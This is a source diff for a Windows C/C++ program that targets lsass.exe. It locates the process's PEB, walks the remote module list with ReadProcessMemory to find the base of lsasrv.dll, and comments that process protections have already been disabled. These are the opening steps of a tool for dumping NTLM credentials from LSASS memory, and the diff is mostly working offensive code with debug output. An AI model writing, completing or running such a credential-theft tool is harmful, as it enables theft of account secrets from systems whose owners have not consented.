@@ -8,7 +8,7 @@
 
 //Target Process
 const wchar_t* wProc = L"lsass.exe";
-
+const wchar_t* wTargetDLL = L"C:\\Windows\\system32\\lsasrv.dll";
 
 
 //Function definition for NtQueryInformationProcess
@@ -161,41 +161,97 @@ bool GetRemoteProcessHandle(HANDLE* hTarget, DWORD* PID) {
 	return true;
 }
 
-
-bool findNTML(HANDLE hTarget, PPEB pPEB, PVOID* pTargetModuleBase) {
-	
-
-	PPEB_LDR_DATA Ldr = pPEB->Ldr;
-
-	PLIST_ENTRY headModule = &Ldr->InMemoryOrderModuleList;
-	PLIST_ENTRY currentModule = headModule->Flink;
-	
-	wchar_t target_module[] = L"C:\\Windows\\System32\\lsasrv.dll";
-
-
-	while (currentModule != headModule) {
-		PLDR_DATA_TABLE_ENTRY LdrDataTableEntry;
-		
-		if (!ReadProcessMemory(hTarget, CONTAINING_RECORD(currentModule, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &LdrDataTableEntry, sizeof(LDR_DATA_TABLE_ENTRY), NULL)) {
-			printf("Error reading remote LDR entry\n");
-			break;
-			return false;
-		}
-		
-		
-		wprintf(L"Reading %s\n", LdrDataTableEntry->FullDllName.Buffer);
-		if (_wcsicmp(LdrDataTableEntry->FullDllName.Buffer, target_module) == 0) {
-			printf("Found module entry for %S!, Base address: 0x%p, Entrypoint: 0x%p\n", LdrDataTableEntry->FullDllName.Buffer, LdrDataTableEntry->DllBase);
-			*pTargetModuleBase = LdrDataTableEntry->DllBase;
-			return true;
-		}
-		currentModule = currentModule->Flink; // advance to next module
-	}
-	printf("Target module not found or not loaded,..\n");
-	return false;
+static BOOL ReadUnicodeStringRemote(
+	HANDLE hProc, const UNICODE_STRING* us, wchar_t* buf, size_t cchBuf)
+{
+	if (!us->Buffer || us->Length == 0) { buf[0] = L'\0'; return TRUE; }
+	SIZE_T toRead = min((SIZE_T)us->Length, (cchBuf - 1) * sizeof(WCHAR));
+	if (!ReadProcessMemory(hProc, us->Buffer, buf, toRead, NULL)) return FALSE;
+	buf[toRead / sizeof(WCHAR)] = L'\0';
+	return TRUE;
 }
 
-bool locatePEB(HANDLE hTarget,PPEB* pPEB) {
+
+bool findLsasrv(HANDLE hTarget, PEB peb, PVOID* pTargetModuleBase) {
+	*pTargetModuleBase = NULL;
+	printf("In NTLM\n");
+	
+	wprintf(L"SEARCHING FOR: %s\n", wTargetDLL);
+
+	// 3) Read remote PEB_LDR_DATA
+	PEB_LDR_DATA ldr = { 0 };
+	printf("In NTLM\n");
+	if (!ReadProcessMemory(hTarget, peb.Ldr, &ldr, sizeof(ldr), NULL)) {
+		printf("LDR\n");
+		return FALSE;
+	}
+	printf("retrieved remote head entry addr\n");
+
+
+	// 4) Compute remote address of list head (InMemoryOrderModuleList)
+	//    and read the head LIST_ENTRY
+	const BYTE* remoteLdrBase = (const BYTE*)peb.Ldr;
+	const BYTE* remoteHeadAddr = remoteLdrBase +
+		offsetof(PEB_LDR_DATA, InMemoryOrderModuleList);
+
+	LIST_ENTRY headLE = { 0 };
+	if (!ReadProcessMemory(hTarget, remoteHeadAddr, &headLE, sizeof(headLE), NULL)) {
+		printf("headLE\n");
+		return false;
+	}
+	printf("retrieved remote head entry addr\n");
+
+	// 5) Iterate: remoteCurrent points to a remote LIST_ENTRY
+	const LIST_ENTRY* remoteCurrentAddr = headLE.Flink;
+	printf("Out of while loops\n");
+	while (remoteCurrentAddr != (const LIST_ENTRY*)remoteHeadAddr) {
+		// Read the current remote LIST_ENTRY
+		LIST_ENTRY curLE = { 0 };
+		if (!ReadProcessMemory(hTarget, remoteCurrentAddr, &curLE, sizeof(curLE), NULL))
+			break;
+
+		// Compute the remote address of the containing LDR_DATA_TABLE_ENTRY:
+		//   entryAddr = remoteCurrentAddr - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)
+		const BYTE* remoteEntryAddr =
+			(const BYTE*)remoteCurrentAddr - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+
+		// Read only the fields we need from the entry to keep it robust
+		struct {
+			LIST_ENTRY InLoadOrderLinks;
+			LIST_ENTRY InMemoryOrderLinks;
+			LIST_ENTRY InInitializationOrderLinks;
+			PVOID      DllBase;
+			PVOID      EntryPoint;
+			ULONG      SizeOfImage;
+			UNICODE_STRING FullDllName;
+			UNICODE_STRING BaseDllName;
+		} entry;
+
+		if (!ReadProcessMemory(hTarget, remoteEntryAddr, &entry, sizeof(entry), NULL))
+			break;
+
+		// Read the UNICODE_STRING buffer (full path)
+		wchar_t fullPath[MAX_PATH * 4]; // large enough for winSxS paths
+		if (!ReadUnicodeStringRemote(hTarget, &entry.FullDllName, fullPath, _countof(fullPath)))
+			fullPath[0] = L'\0';
+
+		// Debug print
+		wprintf(L"Reading %s\n", fullPath);
+
+		// Compare
+		if (_wcsicmp(fullPath, wTargetDLL) == 0) {
+			*pTargetModuleBase = entry.DllBase;
+			printf("MODULE FOUND!!!\n");
+			return TRUE;
+		}
+		// Advance: move to next node using the pointer we just read into curLE
+		remoteCurrentAddr = curLE.Flink;
+	}
+
+	return FALSE;
+}
+
+bool locatePEB(HANDLE hTarget,PVOID* pPEB) {
 	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
 	if (!hNtdll) return false;
 
@@ -213,9 +269,9 @@ bool locatePEB(HANDLE hTarget,PPEB* pPEB) {
 	}
 	printf("pointing pPEB\n");
 
-	*pPEB = pProcBasicInfo.PebBaseAddress;  // struct access, not pointer
+	*pPEB = pProcBasicInfo.PebBaseAddress;  // remote PEB address>????
 	printf("pPEB pointed???????\n");
-
+	return true;
 }
 
 int main(int argc, wchar_t* argv[]) {
@@ -251,29 +307,26 @@ int main(int argc, wchar_t* argv[]) {
 	//Now that process protections are disabled we can ready process memory from userland.
 
 	//Step 1. Locate PEB
-	PPEB pRemotePEB = (PPEB)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB));
-	PPEB pLocalPEB = (PPEB)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB));
-	if (!pRemotePEB) {
-		printf("HeapAlloc failed\n");
-		return 1;
-	}
+	PVOID pRemotePEB;
+	PEB pLocalPEBofRemotePEB;
+	
 	if (!locatePEB(hTarget, &pRemotePEB)) {
 		printf("locatePEB failed\n");
 		return 1;
 	}
+	SIZE_T sBytesTransferred = 0;
+
+	if (!ReadProcessMemory(hTarget, pRemotePEB, &pLocalPEBofRemotePEB, sizeof(PEB), &sBytesTransferred)) {
+		printf("transfering PEB remote to local error\n");
+	}
+
 	printf("PEB Pointer found\n");
 
-	SIZE_T sBytesTransferred = 0;
-	if (!ReadProcessMemory(hTarget, pRemotePEB, pLocalPEB, sizeof(PEB), &sBytesTransferred)) {
-		printf("ReadProcessMemory failed: %lu\n", GetLastError());
-		HeapFree(GetProcessHeap(), 0, pLocalPEB);
-		return 1;
-	}
 	printf("Bytes: %d\n", sBytesTransferred);
 	
 	PVOID pLsasrv = NULL;
-	findNTML(hTarget, pLocalPEB, &pLsasrv);
-	printf("LSASRV: 0x%p", pLsasrv);
+	printf("Outside NTLM\n");
+	findLsasrv(hTarget, pLocalPEBofRemotePEB, &pLsasrv);
 
 	std::cout << "Hello world\n";
 
